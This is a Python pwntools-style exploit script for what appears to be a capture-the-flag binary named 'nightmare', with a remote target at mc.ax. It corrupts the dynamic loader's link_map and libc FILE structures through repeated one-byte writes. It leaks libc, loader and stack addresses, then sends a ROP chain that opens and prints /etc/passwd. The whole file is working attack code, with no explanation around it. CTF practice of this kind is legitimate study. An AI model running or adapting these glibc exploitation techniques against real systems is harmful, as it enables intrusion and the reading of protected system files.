#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file  = './bin/nightmare'
libc_file = './lib/libc.so.6.debug'
ld_file   = './lib/ld-linux-x86-64.so.2.debug'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET')
env.set_item('target',  local   = {'argv':'docker run --rm -i nightmare'.split()}, \
                        remote  = {'host':'mc.ax', 'port':31477})
env.select()

#==========

# Refer: https://hackmd.io/@pepsipu/ry-SK44pt

binf = ELF(bin_file)
ofs_got_write    = binf.got['write']
ofs_got_exit     = binf.got['_Exit']
ofs_dynstr       = binf.sep_section['.dynstr']

libc = ELF(libc_file)
radr_libc_io_str_overflow       = libc.sep_function['_IO_str_overflow']
radr_libc_io_str_finish         = libc.sep_function['_IO_str_finish']
radr_libc_io_file_setbuf_mmap   = libc.sep_function['_IO_file_setbuf_mmap']
radr_libc_io_new_file_overflow  = libc.sep_function['_IO_new_file_overflow']
radr_libc_io_new_file_underflow = libc.sep_function['_IO_new_file_underflow']
# radr_libc_linkmap   = 0x228000

ld = ELF(ld_file)
ofs_ld_dl_fini      = ld.symbols["_dl_fini"]

ld.address = 0x22c000
radr_ld_gotplt      = ld.sep_section['.got.plt']
radr_ld_r_debug     = ld.symbols["_r_debug"]
radr_ld_rtld_local  = ld.symbols["_rtld_local"]
radr_bin_linkmap    = ld.address + 0x36220

ofs_rtld_map        = 0xa08
ofs_rtld_load_lock  = 0x988 # _dl_load_lock
radr_ld_linkmap     = radr_ld_rtld_local + ofs_rtld_map
radr_ld_load_lock   = radr_ld_rtld_local + ofs_rtld_load_lock

elf64_sym = struct.Struct("<LBBHQQ")

#==========

def attack(conn, **kwargs):
    w = Writer(conn)

    binmap = LinkMap(radr_bin_linkmap)
    ldmap  = LinkMap(radr_ld_linkmap)

    w.u8(binmap.l_addr, ofs_got_exit - ofs_got_write)

    w.u8(binmap.l_init_called, 0)
    w.u64(binmap.l_info['DT_FINI_ARRAY'], 0)
    w.u8(binmap.l_info['DT_FINI'], 0xb8)    # DT_DEBUG

    w.data(radr_ld_gotplt + elf64_sym.size*8, elf64_sym.pack(0x166, 0x12, 0, 0xd, ofs_ld_dl_fini, 0xc)) # 8:_dl_x86_get_cpu_features
    w.u8(ldmap.l_info['DT_SYMTAB'], 0xe0)   # DT_PTLGOT

    w.u8(binmap.l_info['DT_VERSYM'], 0x08)  # DT_RELA (l_versions[ndx]->hash == 0)

    ofs_str_write    = next(binf.search(b'write'))
    ofs_dynstr_write = ofs_str_write - ofs_dynstr
    w.data(radr_ld_r_debug + ofs_dynstr_write, b'_dl_x86_get_cpu_features\0')
    w.u8(binmap.l_info['DT_STRTAB'], 0xb8)  # DT_DEBUG
    w.u8(binmap.l_addr, 0)

    f = IOFile(radr_ld_load_lock)

    def call(addr):
        w.u64(binmap.l_addr, addr - radr_ld_r_debug)
        w.u8(binmap.l_init_called, 8)

    '''
    def malloc(size):
        old_size = int((size - 100) / 2)
        w.u64(f.io_write_ptr, old_size+1)
        w.u64(f.io_buf_end, old_size)

        call(radr_libc_io_str_overflow)

    def free():
        call(radr_libc_io_str_finish)
    '''

    w.u8(f.io_read_end, 0)
    w.u8(f.io_buf_base, 0)
    call(radr_libc_io_file_setbuf_mmap)

    w.u8(f.flags+1, 0x8)       # _flags |= _IO_CURRENTLY_PUTTING
    w.u8(f.io_read_end, 0x8)
    w.u8(f.io_write_base, 0x8)
    w.u8(f.fileno, constants.STDOUT_FILENO)
    call(radr_libc_io_new_file_overflow)

    addr_ld_load_lock = u64(conn.recvuntil(p64(4))[-0x18:-0x18+8]) - 0x84
    libc.address = addr_ld_load_lock - radr_ld_load_lock
    ld.address += libc.address
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    info('addr_ld_base      = 0x{:08x}'.format(ld.address))
    addr_heap   = libc.address - 0x42ff0
    addr_libc_environ = libc.symbols['environ']

    conn.recv()

    w.u64(f.io_read_end, (addr_libc_environ-0x10)|8)
    w.u64(f.io_write_base, (addr_libc_environ-0x10)|8)
    w.u64(f.io_write_ptr, addr_libc_environ+0x8)
    call(radr_libc_io_new_file_overflow)

    conn.recvuntil(p64(0))
    addr_stack = u64(conn.recv(8))
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    rop = ROP(libc)
    rop.read(constants.STDIN_FILENO, addr_stack, 0x100)
    rop.call('syscall', [constants.SYS_open, addr_stack, 0])
    rop.read(3, addr_stack, 0x400)
    rop.write(constants.STDOUT_FILENO, addr_stack, 0x400)
    rop.exit(0)
    exploit = bytes(rop)

    w.u64(f.io_buf_base, addr_stack-0x41b0)
    w.u64(f.io_buf_end, addr_stack-0x41b0+len(exploit))
    w.u8(f.fileno, constants.STDIN_FILENO)
    call(radr_libc_io_new_file_underflow)
    conn.send(exploit)
    conn.send(b'/etc/passwd\0')

class Writer:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def u8(self, offset, data):
        self.send(p64(0x42ff0 + offset) + p8(data))

    def u64(self, offset, data):
        for i in range(8):
            self.u8(offset+i, (data>>(8*i))&0xff)

    def data(self, offset, data):
        for i, num in enumerate(data):
            self.u8(offset+i, num)

class LinkMap:
    def __init__(self, addr):
        info_tag = {'DT_STRTAB':5, 'DT_SYMTAB':6, 'DT_FINI':13, 'DT_FINI_ARRAY':26, 'DT_VERSYM':50}

        self.l_addr        = addr
        self.l_info        = { k: addr+0x40+8*v for (k,v) in info_tag.items() }
        self.l_init_called = addr + 0x31c

class IOFile:
    def __init__(self, addr):
        self.flags         = addr
        self.io_read_end   = addr + 0x10
        self.io_write_base = addr + 0x20
        self.io_write_ptr  = addr + 0x28
        self.io_buf_base   = addr + 0x38
        self.io_buf_end    = addr + 0x40
        self.fileno        = addr + 0x70

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
